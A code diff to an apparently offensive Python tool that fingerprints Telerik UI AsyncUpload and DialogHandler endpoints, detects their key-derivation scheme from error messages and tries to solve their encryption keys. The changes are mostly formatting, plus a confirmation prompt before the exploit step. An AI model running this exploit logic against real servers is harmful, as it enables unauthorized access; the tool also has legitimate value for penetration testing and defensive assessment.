@@ -207,7 +207,6 @@ class AsyncUpload:
             "Content-Type"
         ] = f"multipart/form-data; boundary=---------------------------{multipart_boundary}"
         resp = session.send(request, verify=False, proxies=self.proxies)
-        print(resp.text)
         if "Exception Details: " in resp.text:
             print("Verbose Errors are enabled!")
             if "Telerik.Web.UI.CryptoExceptionThrower.ThrowGenericCryptoException" in resp.text:
@@ -218,8 +217,6 @@ class AsyncUpload:
                 print("Version could not be determined")
         else:
             print("Verbose Errors NOT enabled")
-
-
 
     def rau_data_prep(self, version, key, iv, hashkey):
         multipart_boundary = random_hex_string(14)
@@ -262,15 +259,11 @@ class AsyncUpload:
     def select_derive_algos(version):
         if int(version[:4]) <= 2017 or version == "2018.1.117":
             return ["PBKDF1_MS"]
-
-
         elif (int(version[:4]) >= 2020) or (int(version[:4]) == 2019 and int(version[5]) >= 2):
-
             return ["PBKDF2"]
 
         else:  # We don't have solid intelligence on these version so we will try both
             return ["PBKDF1_MS", "PBKDF2"]
-
 
     def solve_key(self):
         reported_early_indicator = False
@@ -346,13 +339,15 @@ class DialogHandler:
             return dialog_parameters
 
     def detect_derive_function(self):
-
         self.key_derive_mode = "PBKDF1_MS"
         KDF_probe_data = {"dialogParametersHolder": "AAAA"}
         res = requests.post(self.url, data=KDF_probe_data, proxies=self.proxies, headers=self.headers, verify=False)
         resp_body = res.text
 
-        if "Exception of type 'System.Exception' was thrown" in resp_body or "The cryptographic operation has failed!" in resp_body:
+        if (
+            "Exception of type 'System.Exception' was thrown" in resp_body
+            or "The cryptographic operation has failed!" in resp_body
+        ):
             self.key_derive_mode = "PBKDF2"
             print(
                 "Target is a newer version of Telerik UI without verbose error messages. Hash key and Encryption key will have to BOTH match. PBKDF2 key derivation is used."
@@ -537,12 +532,20 @@ def main():
             print(f"URL does not appear to be a Telerik UI AsyncUpload Endpoint")
             return
         else:
-            "Target is confirmed to be Telerik UI Async Upload Endpoint"
+            print("Target is confirmed to be Telerik UI Async Upload Endpoint")
 
             rau = AsyncUpload(
-            asyncupload_endpoint, proxies=proxies, headers=headers, include_machinekeys_bool=include_machinekeys_bool
+                asyncupload_endpoint,
+                proxies=proxies,
+                headers=headers,
+                include_machinekeys_bool=include_machinekeys_bool,
             )
             rau.version_probe()
+            response = input("Ready attempt exploit, press enter to continue...")
+            print(response)
+            if response.lower() != "":
+                print("aborting...")
+                sys.exit(2)
             rau.solve_key()
             return
 
